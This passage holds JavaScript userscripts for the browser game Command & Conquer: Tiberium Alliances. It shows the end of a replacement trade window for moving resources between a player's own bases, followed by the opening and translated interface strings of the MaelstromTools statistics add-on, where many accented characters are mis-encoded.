							this.userDefinedMinimumAmount = this.minimumAmountTextField.getValue() == "" ? -1 : parseInt(this.minimumAmountTextField.getValue(), 10); 
							var allCities = ClientLib.Data.MainData.GetInstance().get_Cities().get_AllCities(); 
							for (var currentBase in allCities.d) { 
								if (currentCity.get_Id() != currentBase && allCities.d[currentBase].IsOwnBase()) { 
									var otherCity = allCities.d[currentBase]; 
									var currentBaseID = currentBase; 
									var otherCityName = otherCity.get_Name(); 
									var distance = ClientLib.Base.Util.CalculateDistance(currentCity.get_X(), currentCity.get_Y(), otherCity.get_X(), otherCity.get_Y()); 
									var costToTrade = currentCity.CalculateTradeCostToCoord(otherCity.get_X(), otherCity.get_Y(), 1000); 
									var resourceAmount = Math.floor(otherCity.GetResourceCount(this.resourceTransferType)); 
									var maxResources = Math.floor(otherCity.GetResourceMaxStorage(this.resourceTransferType)); 
									var disqualifyDistance = false; 
									var disqualifyAmount = false; 
									if (this.userDefinedMaxDistance != -1 && this.userDefinedMaxDistance < distance) 
										disqualifyDistance = true; 
									if (this.userDefinedMinimumAmount != -1 && this.userDefinedMinimumAmount > resourceAmount) 
										disqualifyAmount = true; 
									if (!disqualifyDistance && !disqualifyAmount) { 
										var formattedAmount = phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount); 
										tableArray.push({ 
											Base : otherCityName, 
											Distance : distance, 
											Credits : costToTrade, 
											AmountDesc : formattedAmount, 
											Amount : resourceAmount, 
											Max : maxResources.toString(), 
											ID : currentBaseID 
										}); 
									} 
								} 
							} 
							this.tableColumnModel.setDataAsMapArray(tableArray, true); 
							this.selectedRow = null; 
							this.selectedRowData = null; 
							this.tradeWindowTable.resetCellFocus(); 
							this.MaintainTradeWindow(); 
						} 
					}, 
					SelectAllRows : function () { 
						if (this.tradeWindowTable.getSelectionModel().getSelectedCount() != this.tableColumnModel.getRowCount()) { 
							this.tradeWindowTable.getSelectionModel().setSelectionInterval(0, this.tableColumnModel.getRowCount() - 1); 
							this.transferAmountTextField.setValue(""); 
							this.totalResourceAmount = 0; 
							this.costToTradeLabel.setValue("0"); 
							this.selectAllNoneButton.setLabel(qx.locale.Manager.tr("tnf:select none")); 
							this.transferFromBaseLabel.setValue(qx.locale.Manager.tr("tnf:trading with multiple bases")); 
							this.UpdateSelectedRows(this.tableColumnModel.getRowData(0)); 
							this.selectedRowData = this.tableColumnModel.getRowData(0); 
						} else { 
							this.tradeWindowTable.resetSelection(); 
							this.tradeWindowTable.resetCellFocus(); 
							this.transferAmountTextField.setValue(""); 
							this.transferWindowTableSelectedRows = []; 
							this.SetCostLabel(); 
							this.transferAmountTextField.setToolTipText(qx.locale.Manager.tr("tnf:only numbers allowed")); 
							this.transferFromBaseLabel.setValue(qx.locale.Manager.tr("tnf:select base for transfer")); 
							this.selectAllNoneButton.setLabel(qx.locale.Manager.tr("tnf:select all")); 
						} 
					}, 
					AmountSort : function (bI, bJ) { 
						if (bI[4] < bJ[4]) 
							return -1; 
						if (bI[4] > bJ[4]) 
							return 1; 
						return 0; 
					}, 
					UpdateSelectedRows : function (rowData) { 
						this.transferWindowTableSelectedRows = []; 
 
						var localRows = []; 
						var colModel = this.tableColumnModel; 
 
						this.tradeWindowTable.getSelectionModel().iterateSelection(function (index) { 
							var city = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(colModel.getRowData(index).ID); 
							if (city != null && city.CanTrade() == ClientLib.Data.ETradeError.None) 
								localRows.push(colModel.getRowData(index)); 
						}); 
						this.transferWindowTableSelectedRows = localRows; 
 
					}, 
					TradeWindowTableCellClick : function (e) { 
 
						var rowData = this.tableColumnModel.getRowData(e.getRow()); 
						var city = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(rowData.ID); 
 
						this.modifier = 0; 
						this.transferAmountTextField.setValue(""); 
						this.SetCostLabel(); 
 
						if (city != null && city.CanTrade() == ClientLib.Data.ETradeError.None) { 
							this.selectedRow = e.getRow(); 
							this.selectedRowData = rowData; 
 
							this.UpdateSelectedRows(); 
 
							if (this.transferWindowTableSelectedRows.length == 1) 
								this.transferFromBaseLabel.setValue(qx.locale.Manager.tr("tnf:trade with %1", "<b>" + rowData.Base + "</b>")); 
							if (this.transferWindowTableSelectedRows.length > 1) 
								this.transferFromBaseLabel.setValue(qx.locale.Manager.tr("tnf:trading with multiple bases")); 
 
						} 
 
						this.MaintainTradeWindow(); 
 
					}, 
					ChangeResourceType : function (e) { 
						var userObject = e.getData()[0]; 
						this.transferAmountTextField.setValue(""); 
						this.transferWindowTableSelectedRows = []; 
						this.SetCostLabel(); 
						this.tradeWindowTable.resetSelection(); 
						this.tradeWindowTable.resetCellFocus(); 
						this.resourceTransferType = userObject.getUserData("key"); 
						if (this.resourceTransferType == ClientLib.Base.EResourceType.Tiberium) { 
							this.largeTiberiumImage.setSource("webfrontend/ui/common/icon_res_large_tiberium.png"); 
						} else { 
							this.largeTiberiumImage.setSource("webfrontend/ui/common/icon_res_large_crystal.png"); 
						} 
						this.selectAllNoneButton.setLabel(qx.locale.Manager.tr("tnf:select all")); 
						this.MaintainTradeWindow(); 
					}, 
					ResourceAmountChanged : function () { 
						this.modifier = 1; 
						this.SetCostLabel(); 
					}, 
					CalculateTradeCost : function () { 
						this.totalTransferAmount = 0; 
 
						if (this.transferWindowTableSelectedRows.length > 0) { 
 
							var cities = ClientLib.Data.MainData.GetInstance().get_Cities().get_AllCities().d; 
							var selectedCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
 
							if (this.transferWindowTableSelectedRows.length > 1) { 
								for (var base in this.transferWindowTableSelectedRows) { 
									this.totalTransferAmount += cities[this.transferWindowTableSelectedRows[base].ID].CalculateTradeCostToCoord(selectedCity.get_PosX(), selectedCity.get_PosY(), this.transferWindowTableSelectedRows[base].Amount * this.modifier); 
								} 
							} else { 
								this.totalTransferAmount += cities[this.selectedRowData.ID].CalculateTradeCostToCoord(selectedCity.get_PosX(), selectedCity.get_PosY(), parseInt(this.transferAmountTextField.getValue().replace(/[^0-9]/g, ''))); 
							} 
							return this.totalTransferAmount; 
						} 
						return 0; 
					}, 
					ModifyResourceAmount : function (modifier) { 
						this.totalResourceAmount = 0; 
 
						this.UpdateSelectedRows(this.selectedRowData); 
 
						if (this.transferWindowTableSelectedRows.length > 0) { 
							for (var base in this.transferWindowTableSelectedRows) { 
								this.totalResourceAmount += Math.floor(this.transferWindowTableSelectedRows[base].Amount * modifier); 
							} 
							return this.totalResourceAmount; 
						} 
						return 0; 
					}, 
					SetCostLabel : function () { 
						var tradeCost = this.CalculateTradeCost(); 
						if (this.transferAmountTextField.getValue() == "") 
							tradeCost = 0; 
						this.costToTradeLabel.setValue(phe.cnc.gui.util.Numbers.formatNumbersCompactAfterMillion(tradeCost).toString()); 
						this.costToTradeLabel.setToolTipText(phe.cnc.gui.util.Numbers.formatNumbers(tradeCost).toString()); 
						//this.MaintainTradeWindow(); 
					}, 
					TenPercent : function () { 
						this.modifier = 0.1; 
						var resourceAmount = this.ModifyResourceAmount(0.1); 
						this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
						this.SetCostLabel(); 
					}, 
					TwentyFivePercent : function () { 
						this.modifier = 0.25; 
						var resourceAmount = this.ModifyResourceAmount(0.25); 
						this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
						this.SetCostLabel(); 
					}, 
					FiftyPercent : function () { 
						this.modifier = 0.5; 
						var resourceAmount = this.ModifyResourceAmount(0.5); 
						this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
						this.SetCostLabel(); 
					}, 
					SeventyFivePercent : function () { 
						this.modifier = 0.75; 
						var resourceAmount = this.ModifyResourceAmount(0.75); 
						this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
						this.SetCostLabel(); 
					}, 
					OneHundredPercent : function () { 
						this.modifier = 1; 
						var resourceAmount = this.ModifyResourceAmount(1); 
						this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
						this.SetCostLabel(); 
					}, 
					TradeWithBases : function () { 
						var transferAmount = 0; 
						var currentCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
						if (this.transferWindowTableSelectedRows.length > 0) { 
							if (currentCity != null && this.transferAmountTextField.getValue() != "") { 
								for (var base in this.transferWindowTableSelectedRows) { 
									var currentBase = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(this.transferWindowTableSelectedRows[base].ID); 
									if (currentBase != null && currentBase.CanTrade() == ClientLib.Data.ETradeError.None && currentCity.CanTrade() == ClientLib.Data.ETradeError.None) { 
										this.tradeButton.setEnabled(false); 
										if (this.transferWindowTableSelectedRows.length == 1) { 
											transferAmount = parseInt(this.transferAmountTextField.getValue().replace(/[^0-9]/g, '')); 
										} else { 
											transferAmount = parseInt(this.transferWindowTableSelectedRows[base].Amount * this.modifier, 10); 
										} 
										ClientLib.Data.MainData.GetInstance().get_Player().AddCredits(-currentCity.CalculateTradeCostToCoord(currentBase.get_X(), currentBase.get_Y(), transferAmount)); 
										currentCity.AddResources(this.resourceTransferType, transferAmount); 
										currentBase.AddResources(this.resourceTransferType, -transferAmount); 
										ClientLib.Net.CommunicationManager.GetInstance().SendCommand("SelfTrade", { 
											targetCityId : currentCity.get_Id(), 
											sourceCityId : currentBase.get_Id(), 
											resourceType : this.resourceTransferType, 
											amount : transferAmount 
										}, phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, this.TradeResult), null); 
									} 
								} 
 
								this.tradeWindowTable.resetSelection(); 
								this.tradeWindowTable.resetCellFocus(); 
								this.transferWindowTableSelectedRows = []; 
								this.transferAmountTextField.setValue(""); 
								this.selectAllNoneButton.setLabel(qx.locale.Manager.tr("tnf:select all")); 
								this.SetCostLabel(); 
							} 
						} 
					}, 
					TradeResult : function (ce, result) { 
						if (result != ClientLib.Base.EErrorCode.Success) { 
							var city = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(this.selectedRowData.ID); 
							this.tradeConfirmationWidget.showTradeError(this, null, city.get_Name()); 
						} else { 
							this.SetCostLabel(); 
						} 
						this.tradeButton.setEnabled(true); 
					}, 
					UpdateTradeTableData : function () { 
						var updatedResourceCount = []; 
						var otherCity = null; 
						var currentCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
						if (currentCity != null) { 
							var transferWindowsTableData = this.tableColumnModel.getDataAsMapArray(); 
							for (var row in transferWindowsTableData) { 
								otherCity = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(transferWindowsTableData[row].ID); 
								if (otherCity != null && currentCity.get_Id() != otherCity.get_Id() && otherCity.IsOwnBase()) { 
									var otherCityID = otherCity.get_Id(); 
									var otherCityName = otherCity.get_Name(); 
									var otherCityDistance = ClientLib.Base.Util.CalculateDistance(currentCity.get_X(), currentCity.get_Y(), otherCity.get_X(), otherCity.get_Y()); 
									var otherCityTradeCost = currentCity.CalculateTradeCostToCoord(otherCity.get_X(), otherCity.get_Y(), 1000); 
									var otherCityResourceCount = Math.floor(otherCity.GetResourceCount(this.resourceTransferType)); 
									var otherCityMaxStorage = Math.floor(otherCity.GetResourceMaxStorage(this.resourceTransferType)); 
									var otherCityResourceCountFormatted = phe.cnc.gui.util.Numbers.formatNumbers(otherCityResourceCount); 
									updatedResourceCount.push({ 
										Base : otherCityName, 
										Distance : otherCityDistance, 
										Credits : otherCityTradeCost, 
										AmountDesc : otherCityResourceCountFormatted, 
										Amount : otherCityResourceCount, 
										Max : otherCityMaxStorage.toString(), 
										ID : otherCityID 
									}); 
								} else { 
									updatedResourceCount.push(transferWindowsTableData[row]); 
								} 
							} 
							this.tableColumnModel.setDataAsMapArray(updatedResourceCount, true, false); 
							if (this.selectedRow != null) { 
								var selectedRowData = this.tableColumnModel.getRowData(this.selectedRow); 
								otherCity = ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(selectedRowData.ID); 
								if (otherCity != null && currentCity.get_Id() != otherCity.get_Id() && otherCity.IsOwnBase() && otherCity.CanTrade() != ClientLib.Data.ETradeError.None) { 
									this.selectedRowData = null; 
									this.selectedRow = null; 
									this.tradeWindowTable.resetCellFocus(); 
								} else { 
									this.selectedRowData = selectedRowData; 
								} 
							} 
						} 
					}, 
					MaintainTradeWindow : function () { 
 
						var hasEnoughtCredits = false; 
						var validResourceAmount = true; 
 
						if (this.transferWindowTableSelectedRows.length > 0) { 
 
							var resourcesInTextField = parseInt(this.transferAmountTextField.getValue().replace(/[^0-9]/g, '')); 
							var tradeCost = this.CalculateTradeCost(); 
							var playerCreditCount = ClientLib.Data.MainData.GetInstance().get_Player().GetCreditsCount(); 
 
							if (playerCreditCount < tradeCost) { 
								this.costToTradeLabel.setTextColor("text-error"); 
							} else { 
								this.costToTradeLabel.resetTextColor(); 
							} 
 
							var selectedBaseResourceAmount = parseInt(this.selectedRowData.Amount, 10); 
 
							if (this.transferAmountTextField.getValue() != "" && this.transferWindowTableSelectedRows.length > 1) { 
								//Automatically update the text field with the new resource amount each tick 
								var resourceAmount = this.ModifyResourceAmount(this.modifier); 
								this.transferAmountTextField.setValue(phe.cnc.gui.util.Numbers.formatNumbers(resourceAmount)); 
								this.SetCostLabel(); 
							} 
 
							if (this.transferWindowTableSelectedRows.length == 1) { 
								if (resourcesInTextField == 0 || selectedBaseResourceAmount < resourcesInTextField) { 
									this.transferAmountTextField.setTextColor("text-error"); 
								} else { 
									this.transferAmountTextField.resetTextColor(); 
								} 
								validResourceAmount = resourcesInTextField > 0 && resourcesInTextField <= selectedBaseResourceAmount; 
							} 
 
							hasEnoughtCredits = playerCreditCount >= tradeCost; 
 
						} 
 
						this.tradeButton.setEnabled(this.transferWindowTableSelectedRows.length > 0 && hasEnoughtCredits && validResourceAmount && this.transferAmountTextField.getValue() != ""); 
						this.transferAmountTextField.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
						this.tenPercentButton.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
						this.twentyFivePercentButton.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
						this.fiftyPercentButton.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
						this.seventyFivePercentButton.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
						this.oneHundredPercentButton.setEnabled(this.transferWindowTableSelectedRows.length > 0); 
 
						this.transferAmountTextField.setReadOnly(this.transferWindowTableSelectedRows.length > 1); 
 
						if (this.tradeWindowTable.getSelectionModel().getSelectedCount() > 1) { 
							this.transferAmountTextField.setToolTipText(qx.locale.Manager.tr("tnf:percent buttons")); 
						} else { 
							this.transferAmountTextField.setToolTipText(qx.locale.Manager.tr("tnf:only numbers allowed")); 
						} 
 
					}, 
					_onTick : function () { 
						var currentCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
						if (currentCity != null && currentCity.get_HasIncommingAttack()) { 
							this.onBtnClose(); 
						} 
						this.UpdateTradeTableData(); 
						this.MaintainTradeWindow(); 
					} 
				} 
			}); 
		} 
 
		function NewTradeOverlay_checkIfLoaded() { 
			try { 
				if (typeof qx !== 'undefined' && typeof qx.locale !== 'undefined' && typeof qx.locale.Manager !== 'undefined' && typeof webfrontend.gui.trade.TradeOverlay !== 'undefined') { 
					qx.Class.undefine("webfrontend.gui.trade.TradeOverlay"); 
					CreateNewTradeOverlay(); 
				} else { 
					window.setTimeout(NewTradeOverlay_checkIfLoaded, 1000); 
				} 
			} catch (e) { 
				console.log("NewTradeOverlay_checkIfLoaded: ", e); 
			} 
		} 
 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			window.setTimeout(NewTradeOverlay_checkIfLoaded, 1000); 
		} 
	}; 
 
	try { 
		var NewTradeOverlay = document.createElement("script"); 
		NewTradeOverlay.innerHTML = "(" + NewTradeOverlay_main.toString() + ")();"; 
		NewTradeOverlay.type = "text/javascript"; 
		if (/commandandconquer\.com/i.test(document.domain)) { 
			document.getElementsByTagName("head")[0].appendChild(NewTradeOverlay); 
		} 
	} catch (e) { 
		console.log("NewTradeOverlay: init error: ", e); 
	} 
 
})(); 




// ==UserScript== 
// @name        MaelstromTools Dev 
// @namespace   MaelstromTools 
// @description Just a set of statistics & summaries about repair time and base resources. Mainly for internal use, but you are free to test and comment it. 
// @version     0.1.3.2 
// @author      Maelstrom, HuffyLuf, KRS_L and Krisan 
// @include     http*://prodgame*.alliances.commandandconquer.com/*/index.aspx* 
// ==/UserScript== 
//var offense_units = own_city.get_CityArmyFormationsManager().GetFormationByTargetBaseId(current_city.get_Id()).get_ArmyUnits().l; 
//System.Int64 GetForumIdByType (ClientLib.Data.Forum.EForumType eForumType) 
//static ClientLib.Data.Forum.EForumType NormalForum 
//System.Collections.Generic.List$1 get_ForumsAlliance () 
//System.Void CreateThread (System.Int64 forumId ,System.String threadTitle ,System.String threadPost ,System.Boolean autoSubscribe) 
//System.Void CreatePost (System.Int64 forumId ,System.Int64 threadId ,System.String postMessage) 
//System.Void StartGetForumThreadData (System.Int64 forumId ,System.Int32 skip ,System.Int32 take) 
//System.Void OnForumThreadDataReceived (System.Object context ,System.Object result) 
//System.Void add_ThreadsFetched (ClientLib.Data.ForumThreadsFetched value) 
//System.Void MarkThreadsAsRead (System.Int64 forumId ,System.Int64[] threadIds) 
// 
//var score = ClientLib.Base.PointOfInterestTypes.GetScoreByLevel(lvl); 
//var scoreNext = ClientLib.Base.PointOfInterestTypes.GetNextScore(score); 
//var resBonus = ClientLib.Base.PointOfInterestTypes.GetBonusByType(ClientLib.Base.EPOIType.TiberiumBonus, score); 
//var unitBonus = ClientLib.Base.PointOfInterestTypes.GetBonusByType(ClientLib.Base.EPOIType.InfanteryBonus, score); 
//console.log("POI lvl" + lvl + "gives " + score + "points, next lvl at " + scoreNext + " points. Resource bonus: " + resBonus + " Unit bonus: " + unitBonus + "%"); 
/* 
 ClientLib.Data.Player 
 get_ResearchPoints 
 GetCreditsCount 
 GetCreditsGrowth 
ClientLib.Data.PlayerResearch get_PlayerResearch () 
ClientLib.Data.PlayerResearchItem GetResearchItemFomMdbId (System.Int32 _mdbId) 
ClientLib.Data.PlayerResearchItem.System.Object get_NextLevelInfo_Obj () 
 
var cw=ClientLib.Data.MainData.GetInstance().get_Player().get_Faction(); 
var cj=ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction(ClientLib.Base.ETechName.Research_BaseFound,cw); 
var cd=cr.GetResearchItemFomMdbId(cj); 
 */ 
(function () { 
  var MaelstromTools_main = function () { 
    try { 
      function CCTAWrapperIsInstalled() { 
        return (typeof (CCTAWrapper_IsInstalled) != 'undefined' && CCTAWrapper_IsInstalled); 
      } 
 
      function createMaelstromTools() { 
        console.log('MaelstromTools loaded'); 
 
        qx.Class.define("MaelstromTools.Language", { 
          type: "singleton", 
          extend: qx.core.Object, 
          construct: function (language) { 
            this.Languages = ['de', 'pt', 'fr', 'tr']; // en is default, not needed in here! 
            if (language != null) { 
              this.MyLanguage = language; 
            } 
          }, 
          members: { 
            MyLanguage: "en", 
            Languages: null, 
            Data: null, 
 
            loadData: function (language) { 
              var l = this.Languages.indexOf(language.substr(0,2)); 
 
              if (l < 0) { 
                this.Data = null; 
                return; 
              } 
 
              this.Data = new Object(); 
              this.Data["Collect all packages"] = ["Alle Pakete einsammeln", "Recolher todos os pacotes", "RÃ©cupÃ©rez tous les paquets", "TÃ¼m paketleri topla"][l]; 
              this.Data["Overall production"] = ["ProduktionsÃ¼bersicht", "ProduÃ§Ã£o global", "La production globale", "Genel Ã¼retim"][l]; 
              this.Data["Army overview"] = ["TruppenÃ¼bersicht", "Vista Geral de ExÃ©rcito", "ArmÃ©e aperÃ§u", "Ordu Ã¶nizlemesi"][l]; 
              this.Data["Base resources"] = ["Basis Ressourcen", "Recursos base", "ressources de base", "Ãœs Ã¶nizlemesi"][l]; 
              this.Data["Main menu"] = ["HauptmenÃ¼", "Menu Principal", "menu principal", "Ana menÃ¼"][l]; 
              this.Data["Repair all units"] = ["Alle Einheiten reparieren", "Reparar todas as unidades", "RÃ©parer toutes les unitÃ©s", "TÃ¼m Ã¼niteleri onar"][l]; 
              this.Data["Repair all defense buildings"] = ["Alle VerteidigungsgebÃ¤ude reparieren", "Reparar todos os edifÃ­cios de defesa", "RÃ©parer tous les bÃ¢timents de dÃ©fense", "TÃ¼m savunma binalarÄ±nÄ± onar"][l]; 
              this.Data["Repair all buildings"] = ["Alle GebÃ¤urde reparieren", "Reparar todos os edifÃ­cios", "RÃ©parer tous les bÃ¢timents", "TÃ¼m binalarÄ± onar"][l]; 
              this.Data["Base status overview"] = ["BasisÃ¼bersicht", "Estado geral da base", "aperÃ§u de l'Ã©tat de base", "Ãœs durumu Ã¶nizlemesi"][l]; 
              this.Data["Upgrade priority overview"] = ["Upgrade Ãœbersicht", "Prioridade de upgrades", "aperÃ§u des prioritÃ©s de mise Ã  niveau", "YÃ¼kseltme Ã¶nceliÄŸi Ã¶nizlemesi"][l]; 
              this.Data["MaelstromTools Preferences"] = ["MaelstromTools Einstellungen", "PreferÃªncias de MaelstromTools", "PrÃ©fÃ©rences MaelstromTools", "MaelstromTools AyarlarÄ±"][l]; 
              this.Data["Options"] = ["Einstellungen", "OpÃ§Ãµes", "Options", "SeÃ§enekler"][l]; 
              this.Data["Target out of range, no resource calculation possible"] = ["Ziel nicht in Reichweite, kann die plÃ¼nderbaren Ressourcen nicht berechnen", "Alvo fora do alcance, nÃ£o Ã© possivel calcular os recursos", "Cible hors de portÃ©e, pas de calcul de ressources possible", 
			  "Hedef menzil dÄ±ÅŸÄ±nda, kaynak hesaplamasÄ± olanaksÄ±z"][l]; 
              this.Data["Lootable resources"] = ["PlÃ¼nderbare Ressourcen", "Recursos roubÃ¡veis", "Ressources Ã  piller", "YaÄŸmalanabilir kaynaklar"][l]; 
              this.Data["per CP"] = ["pro KP", "por PC", "par PC", "KP baÅŸÄ±na"][l]; 
              this.Data["2nd run"] = ["2. Angriff", "2Âº ataque", "2Â° attaque", "2. saldÄ±rÄ±"][l]; 
              this.Data["3rd run"] = ["3. Angriff", "3Âº ataque", "3Â° attaque", "3. saldÄ±rÄ±"][l]; 
              this.Data["Calculating resources..."] = ["Berechne plÃ¼nderbare Ressourcen...", "A calcular recursos...", "calcul de ressources ...", "Kaynaklar hesaplanÄ±yor..."][l]; 
              this.Data["Next MCV"] = ["MBF", "MCV", "VCM"][l]; 
              this.Data["Show time to next MCV"] = ["Zeige Zeit bis zum nÃ¤chsten MBF", "Mostrar tempo restante atÃ© ao prÃ³ximo MCV", "Afficher l'heure pour le prochain VCM ", "SÄ±rdaki MCV iÃ§in gereken sÃ¼reyi gÃ¶ster"][l]; 
              this.Data["Show lootable resources (restart required)"] = ["Zeige plÃ¼nderbare Ressourcen (Neustart nÃ¶tig)", "Mostrar recursos roubÃ¡veis (Ã© necessÃ¡rio reiniciar)", "Afficher les ressources fouiller (redÃ©marrage nÃ©cessaire)", "YaÄŸmalanabilir kaynaklarÄ± gÃ¶ster (yeniden baÅŸlatma gerekli)"][l]; 
              this.Data["Use dedicated Main Menu (restart required)"] = ["Verwende extra HauptmenÃ¼ (Neustart nÃ¶tig)", "Usar botÃ£o para o Menu Principal (Ã© necessÃ¡rio reiniciar)", "Utiliser dÃ©diÃ©e du menu principal (redÃ©marrage nÃ©cessaire)", "Ana menÃ¼ tuÅŸunu kullan (yeniden baÅŸlatma gerekli)"][l]; 
              this.Data["Autocollect packages"] = ["Sammle Pakete automatisch", "Auto recolher pacotes", "paquets autocollectÃ©", "Paketleri otomatik topla"][l]; 
              this.Data["Autorepair units"] = ["Repariere Einheiten automatisch", "Auto reparar o exÃ©rcito", "unitÃ©s autorÃ©parÃ©", "Ãœniteleri otomatik onar"][l]; 
              this.Data["Autorepair defense (higher prio than buildings)"] = ["Repariere Verteidigung automatisch (hÃ¶here Prio als GebÃ¤ude)", "Auto reparar defesa (maior prioridade do que os edifÃ­cios)", "rÃ©paration automatique la dÃ©fense (prioritÃ© plus Ã©levÃ© que les bÃ¢timents) ", "SavunmayÄ± otomatik onar (binalardan daha yÃ¼ksek Ã¶ncelikli olarak)"][l]; 
              this.Data["Autorepair buildings"] = ["Repariere GebÃ¤ude automatisch", "Auto reparar edifÃ­cios", "bÃ¢timents autorÃ©parÃ©", "BinalarÄ± otomatik onar"][l]; 
              this.Data["Automatic interval in minutes"] = ["Auto-Intervall in Minuten", "Intervalo de tempo automÃ¡tico (em minutos)", "intervalle automatique en quelques minutes", "Otomatik toplama aralÄ±ÄŸÄ± (dk)"][l]; 
              this.Data["Apply changes"] = ["Speichern", "Confirmar", "Appliquer changements", "Uygula"][l]; 
              this.Data["Discard changes"] = ["Abbrechen", "Cancelar", "Annuler changements", "Ä°ptal"][l]; 
              this.Data["Reset to default"] = ["Auf Standard zurÃ¼cksetzen", "DefiniÃ§Ãµes padrÃ£o", "RÃ©initialiser", "SÄ±fÄ±rla"][l]; 
              this.Data["Continuous"] = ["Kontinuierlich", "ContÃ­nua", "continue", "SÃ¼rekli"][l]; 
              this.Data["Bonus"] = ["Pakete", "BÃ³nus", "Bonus", "Bonus"][l]; 
              this.Data["POI"] = ["POI", "POI", "POI", "POI"][l]; 
              this.Data["Total / h"] = ["Gesamt / h", "Total / h", "Total / h", "Toplam / sa."][l]; 
              this.Data["Repaircharges"] = ["Reparaturzeiten", "Custo de reparaÃ§Ã£o", "frais de rÃ©paration", "OnarÄ±m maliyeti"][l]; 
              this.Data["Repairtime"] = ["Max. verfÃ¼gbar", "Tempo de reparaÃ§Ã£o", "Temps de rÃ©paration", "OnarÄ±m sÃ¼resi"][l]; 
              this.Data["Attacks"] = ["Angriffe", "Ataques", "Attaques", "SaldÄ±rÄ±lar"][l]; 
              this.Data[MaelstromTools.Statics.Infantry] = ["Infanterie", "Infantaria", "Infanterie", "Piyade"][l]; 
              this.Data[MaelstromTools.Statics.Vehicle] = ["Fahrzeuge", "VeÃ­culos", "Vehicule", "Motorlu B."][l]; 
              this.Data[MaelstromTools.Statics.Aircraft] = ["Flugzeuge", "Aeronaves", "Aviation", "Hava A."][l]; 
              this.Data[MaelstromTools.Statics.Tiberium] = ["Tiberium", "TibÃ©rio", "Tiberium", "Tiberium"][l]; 
              this.Data[MaelstromTools.Statics.Crystal] = ["Kristalle", "Cristal", "Cristal", "Kristal"][l]; 
              this.Data[MaelstromTools.Statics.Power] = ["Strom", "PotÃªncia", "Energie", "GÃ¼Ã§"][l]; 
              this.Data[MaelstromTools.Statics.Dollar] = ["Credits", "CrÃ©ditos", "CrÃ©dit", "Kredi"][l]; 
              this.Data[MaelstromTools.Statics.Research] = ["Forschung", "InvestigaÃ§Ã£o", "Recherche", "AraÅŸtÄ±rma"][l]; 
              this.Data["Base"] = ["Basis", "Base", "Base", "Ãœs"][l]; 
              this.Data["Defense"] = ["Verteidigung", "Defesa", "DÃ©fense", "Savunma"][l]; 
              this.Data["Army"] = ["Armee", "ExÃ©rcito", "ArmÃ©e", "Ordu"][l]; 
              this.Data["Level"] = ["Stufe", "NÃ­vel", "Niveau", "Seviye"][l]; 
              this.Data["Buildings"] = ["GebÃ¤ude", "EdifÃ­cios", "BÃ¢timents", "Binalar"][l]; 
              this.Data["Health"] = ["Leben", "Vida", "SantÃ©", "SaÄŸlÄ±k"][l]; 
              this.Data["Units"] = ["Einheiten", "Unidades", "UnitÃ©s", "Ãœniteler"][l]; 
              this.Data["Hide Mission Tracker"] = ["Missionsfenster ausblenden", "Esconder janela das MissÃµes", "Cacher la fenÃªtre de mission", "GÃ¶rev Ä°zleyicisini Gizle"][l]; 
              this.Data["none"] = ["keine", "nenhum", "aucun", "hiÃ§biri"][l]; 
              this.Data["Cooldown"] = ["Cooldown", "RelocalizaÃ§Ã£o", "Recharge", "Cooldown"][l]; 
              this.Data["Protection"] = ["GeschÃ¼tzt bis", "ProtecÃ§Ã£o", "Protection", "Koruma"][l]; 
              this.Data["Available weapon"] = ["VerfÃ¼gbare Artillerie", "Apoio disponÃ­vel", "arme disponible", "Mevcut silah"][l]; 
              this.Data["Calibrated on"] = ["Kalibriert auf", "Calibrado em", "CalibrÃ© sur ", "Kalibreli"][l]; 
              this.Data["Total resources"] = ["Gesamt", "Total de recursos", "Ressources totales", "Toplam kaynaklar"][l]; 
              this.Data["Max. storage"] = ["Max. KapazitÃ¤t", "Armazenamento MÃ¡x.", "Max. de stockage", "Maks. Depo"][l]; 
              this.Data["Storage full!"] = ["Lager voll!", "Armazenamento cheio!", "Stockage plein", "Depo dolu!"][l]; 
              this.Data["Storage"] = ["Lagerstand", "Armazenamento", "Stockage", "Depo"][l]; 
              this.Data["display only top buildings"] = ["Nur Top-GebÃ¤ude anzeigen", "Mostrar apenas melhores edifÃ­cios", "afficher uniquement les bÃ¢timents principaux", "yalnÄ±zca en iyi binalarÄ± gÃ¶ster"][l]; 
              this.Data["display only affordable buildings"] = ["Nur einsetzbare GebÃ¤ude anzeigen", "Mostrar apenas edÃ­ficios acessÃ­veis", "afficher uniquement les bÃ¢timents abordables", "yalnÄ±zca satÄ±n alÄ±nabilir binalarÄ± gÃ¶ster"][l]; 
              this.Data["City"] = ["Stadt", "Base", "Base", "Åžehir"][l]; 
              this.Data["Type (coord)"] = ["Typ (Koord.)", "Escrever (coord)", "Type (coord)", "Tip (koord.)"][l]; 
              this.Data["to Level"] = ["Auf Stufe", "para nÃ­vel", "Ã  Niveau ", "Seviye iÃ§in"][l]; 
              this.Data["Gain/h"] = ["Zuwachs/h", "Melhoria/h", "Gain / h", "KazanÃ§ / sa."][l]; 
              this.Data["Factor"] = ["Faktor", "Factor", "Facteur", "FaktÃ¶r"][l]; 
